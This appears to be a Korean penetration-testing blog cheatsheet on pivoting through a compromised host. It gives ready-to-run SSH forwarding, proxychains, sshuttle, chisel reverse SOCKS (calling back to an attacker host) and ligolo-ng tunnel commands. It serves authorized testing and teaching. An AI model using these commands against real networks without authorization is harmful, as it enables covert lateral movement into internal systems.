---
title: "피벗·터널링 도구 치트시트"
date: 2026-10-17 09:00:00 +0900
categories: [Network, Post-Exploitation]
tags: [pivoting, tunneling, chisel, ligolo-ng, proxychains, cheatsheet]
description: "장악한 호스트를 경유해 내부망에 닿는 포트포워딩·SOCKS·터널 구성(chisel·ligolo-ng·sshuttle·proxychains)을 상황별로 정리한 치트시트입니다."
mermaid: true
---

> 피벗은 "닿지 않는 내부망"에 경유지를 두는 것입니다. 단일 포트면 포트포워딩, 여러 대상이면 SOCKS, 전체 경로가 필요하면 터널을 세웁니다. 예시 IP는 문서용(`203.0.113.x`)과 플레이스홀더입니다.

## 개념

```mermaid
flowchart LR
  K[공격 호스트] --> P[경유 호스트]
  P --> I[내부 대상]
  K -.SOCKS/포워딩.-> I
```

- **포트포워딩**: 특정 서비스 하나만 로컬처럼 당겨 옴.
- **SOCKS 프록시**: 경유 호스트를 프록시로 만들어 도구를 통째로 흘림(proxychains).
- **인터페이스 터널**: ligolo-ng로 내부 대역을 라우팅해 가장 자연스럽게 사용.

## 공격·우회 구문

허가된 범위에서만. 경유/대상 IP는 예시입니다.

### SSH 기반 포워딩

```bash
# 로컬 포워딩: 내 9000 → 경유 → 내부:3306
ssh -L 9000:203.0.113.20:3306 user@$PIVOT

# 동적(SOCKS) 포워딩
ssh -D 1080 user@$PIVOT
# /etc/proxychains.conf 에 socks5 127.0.0.1 1080 추가 후
proxychains nmap -sT -Pn 203.0.113.20

# sshuttle: 서브넷 통째 라우팅(VPN처럼)
sshuttle -r user@$PIVOT 203.0.113.0/24
```

### chisel (SSH가 없을 때)

```bash
# 공격 호스트(서버)
./chisel server -p 8000 --reverse

# 경유 호스트(클라이언트) → 역방향 SOCKS
./chisel client $LHOST:8000 R:socks
```

### ligolo-ng (인터페이스 터널)

```bash
# 공격 호스트: 프록시 + tun 인터페이스
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# 경유 호스트에서 agent 실행 후, 콘솔에서 세션 선택 → 내부 대역 라우트 추가
# session ; start ; 그리고 공격 호스트에서
sudo ip route add 203.0.113.0/24 dev ligolo
```

> 판단 포인트: 피벗 직후 **DNS와 시간 동기화**부터 확인합니다. 내부 이름 해석이 안 되거나 시계가 틀어지면 Kerberos·도메인 작업이 통째로 실패하는데, 원인을 피벗이 아니라 자격증명으로 오해하기 쉽습니다.

> 판단 포인트: proxychains로 돌릴 땐 `-sT`(TCP 커넥트)만 됩니다. SYN 스캔·UDP는 프록시를 못 타니 도구 옵션을 바꿔야 합니다.

## 함께 보기

- [피벗팅과 터널링](/notes/pivoting-and-tunneling/)
- [모의침투 작전 흐름](/notes/penetration-testing-operation-flow/)

## 참고 자료

- [MITRE ATT&CK: Proxy — Internal Proxy (T1090.001)](https://attack.mitre.org/techniques/T1090/001/)
- [OpenSSH manual — port forwarding](https://man.openbsd.org/ssh#L)
- [MITRE ATT&CK: Network Boundary Bridging (T1599)](https://attack.mitre.org/techniques/T1599/)
